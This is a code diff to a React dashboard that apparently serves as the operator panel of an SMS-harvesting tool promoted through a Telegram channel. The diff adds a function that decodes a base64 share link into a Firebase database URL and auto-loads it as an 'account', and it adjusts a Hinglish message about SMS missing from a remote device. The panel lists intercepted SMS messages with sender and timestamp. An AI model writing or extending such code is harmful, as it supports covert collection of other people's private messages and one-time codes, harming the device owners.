@@ -8,6 +8,16 @@ const LS_JOINED = "ab_tg_joined";
 const CHANNEL_LINK = "https://t.me/piratesbabaz";
 const CHANNEL_NAME = "@piratesbabaz";
 
+
+function decodeShare(s) {
+  try {
+    const raw = atob(s);
+    const url = raw.split("|||")[0].split("|")[0].trim();
+    if (url.includes("firebase")) return url.replace(/\/$/, "").replace(/\.json$/i, "");
+  } catch {}
+  return "";
+}
+
 function uid() {
   return Math.random().toString(36).slice(2, 10);
 }
@@ -35,10 +45,29 @@ export default function Dashboard() {
 
   useEffect(() => {
     try {
-      const acc = JSON.parse(localStorage.getItem(LS_ACCOUNTS) || "[]");
+      let acc = JSON.parse(localStorage.getItem(LS_ACCOUNTS) || "[]");
       setAccounts(acc);
-      const act = localStorage.getItem(LS_ACTIVE) || (acc[0] && acc[0].id) || "";
+      let act = localStorage.getItem(LS_ACTIVE) || (acc[0] && acc[0].id) || "";
       setActiveId(act);
+      const sp = new URLSearchParams(window.location.search).get("s");
+      if (sp) {
+        const sharedUrl = decodeShare(sp);
+        if (sharedUrl) {
+          const exists = acc.find((a) => (a.url || "").includes(sharedUrl.replace("https://", "").slice(0, 18)));
+          if (!exists) {
+            const item = { id: uid(), url: sharedUrl, auth: "", label: sharedUrl, addedAt: new Date().toISOString() };
+            acc = [item, ...acc];
+            localStorage.setItem(LS_ACCOUNTS, JSON.stringify(acc));
+            setAccounts(acc);
+            act = item.id;
+            setActiveId(item.id);
+            localStorage.setItem(LS_ACTIVE, item.id);
+          } else {
+            setActiveId(exists.id);
+            localStorage.setItem(LS_ACTIVE, exists.id);
+          }
+        }
+      }
       if (localStorage.getItem(LS_JOINED) !== "1") setShowJoin(true);
     } catch {
       if (localStorage.getItem(LS_JOINED) !== "1") setShowJoin(true);
@@ -328,7 +357,7 @@ export default function Dashboard() {
               onChange={(e) => setSmsFilter(e.target.value)}
             />
             {smsLoading && <div className="empty">Loading SMS...</div>}
-            {!smsLoading && smsFiltered.length === 0 && <div className="empty">Is device pe SMS nahi mili.\nPath check / device offline ho sakta hai.</div>}
+            {!smsLoading && smsFiltered.length === 0 && <div className="empty">Is device pe SMS nahi mili. Path/offline check karo.</div>}
             {smsFiltered.map((m) => (
               <div className="sms-row" key={m.key}>
                 <div className="s">{m.sender || "Unknown"} · {m.ts || m.key}</div>
